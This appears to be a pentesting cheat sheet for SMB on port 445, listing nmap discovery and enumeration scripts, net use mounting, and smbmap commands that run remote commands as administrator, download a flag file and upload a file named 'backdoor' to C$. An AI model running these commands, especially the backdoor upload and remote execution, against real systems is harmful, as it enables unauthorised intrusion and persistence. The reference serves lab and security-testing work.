---
description: 'Port: 445'
---

# SMB

## SMB Discover and Mount

### Nmap command to check port 445/tcp open

```
PS> nmap <ip address/cidr> --open
```

### Steps to connect to SMB share on windows

* Right click on Network
* Map network drive
* Enter the IP address of the target machine as: \\\\\<ip address>
* Click on Browse
* Double click on the IP address
* Enter Username and Password
* Ok

### Remove existing mounted drive using CMD

```
net use * /delete
```

### Mount the remote SMB drive using CMD

```
net use Z: \\<ip address>\C$ <password> /user:<username>
```



***

## SMBMap

### Check supported protocols and dialects of an SMB server

```
nmap -p 445 --script smb-protocols <IP address>
```

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### Access SMB Server

```
smbmap -u guest -p "" -d . -H <IP address>
```

### Access the remote shares using admin creds

```
smbmap -u administrator -p <password> -d . -H <IP address>
```

### Execute commands on the target machine

```
smbmap -H <IP address> -u administrator -p <password> -x 'ipconfig'
```

### List available drives

```
smbmap -H <IP address> -u Administrator -p '<password>' -L 
```

### List Contents of C: drive

```
smbmap -H <IP address> -u Administrator -p '<password>' -r 'C$'
```

### Create a backdoor file and Upload to the target machine

```
smbmap -H <IP address> -u Administrator -p '<password>' --upload '/root/backdoor' 'C$\backdoor'
```

### Download a file

```
smbmap -H <IP address> -u Administrator -p '<password>' --download 'C$\flag.txt'
```



***

## SMB Nmap Scripts

### Get the information about SMB security level

```
nmap -p 445 --script smb-security-mode <IP address>
```

### Enumerate the users logged into a system

```
nmap -p445 --script smb-enum-sessions <IP address>
```

### Enumerate the users logged into a system through SMB share using creds

```
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=<password> <IP address>
```

### Enumerate all available shares

```
nmap -p445 --script smb-enum-shares <IP addr>
```

### Enumerate all available shares using valid creds

```
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=<password> <IP addr>
```

### Enumerate the windows users

```
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=<password> <IP address>
```

### Get information about the server statistics

```
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=<password> <IP address>
```

### Enumerate available domains

```
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=<password> <IP address>
```

### Enumerate available groups

```
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=<password> <IP addr>
```

### Enumerate Services

```
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=<password> <IP address>
```

### Enumerating all  the shared folders and drives then running the ls command in each shares

```
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=<password> <IP addr>
```

